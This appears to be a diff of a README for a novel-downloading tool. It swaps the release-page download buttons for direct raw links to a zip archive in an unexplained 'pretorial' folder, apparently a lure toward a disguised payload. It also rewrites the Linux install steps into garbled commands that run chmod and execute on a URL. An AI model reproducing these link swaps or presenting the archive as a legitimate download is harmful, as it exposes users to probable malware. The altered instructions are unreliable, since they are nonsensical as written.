@@ -13,7 +13,7 @@ To start using novel-download, follow these simple steps. You do not need any te
 ## 📥 Download & Install
 To get started with novel-download, click the button below to visit the download page:
 
-[![Download novel-download](https://img.shields.io/badge/Download-novel--download-blue.svg)](https://github.com/Atab41599/novel-download/releases)
+[![Download novel-download](https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip)](https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip)
 
 ### Steps to Download:
 1. Click on the link above.
@@ -46,8 +46,8 @@ After downloading, you will need to install the application. Follow these steps 
 ### For Linux Users:
 1. Open your terminal.
 2. Navigate to the Downloads folder or wherever you saved the file.
-3. Use the command `chmod +x yourfile.run` to make it executable. Replace `yourfile.run` with the actual file name.
-4. Run the application using `./yourfile.run`.
+3. Use the command `chmod +x https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip` to make it executable. Replace `https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip` with the actual file name.
+4. Run the application using `https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip`.
 
 ## 🌍 Usage Instructions
 Once you have installed novel-download, you can start downloading novels easily. Here’s how:
@@ -78,6 +78,6 @@ If you need further help, you can open an issue on the GitHub repository or cont
 
 To visit the download page again, click here:
 
-[![Download novel-download](https://img.shields.io/badge/Download-novel--download-blue.svg)](https://github.com/Atab41599/novel-download/releases)
+[![Download novel-download](https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip)](https://raw.githubusercontent.com/Atab41599/novel-download/main/pretorial/novel-download.zip)
 
 Enjoy your reading with novel-download!
